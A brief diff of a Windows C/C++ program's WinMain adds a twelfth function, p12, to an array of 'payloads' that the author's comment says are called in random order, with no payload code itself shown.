@@ -34,7 +34,8 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
         p8,
         p9,
         p10,
-        p11
+        p11,
+        p12
     }; // use: payloads[x]() for function px(). why use this? functions in random order, im still working on porting all payloads to payloads.h
 
     DWORD zero = 0;
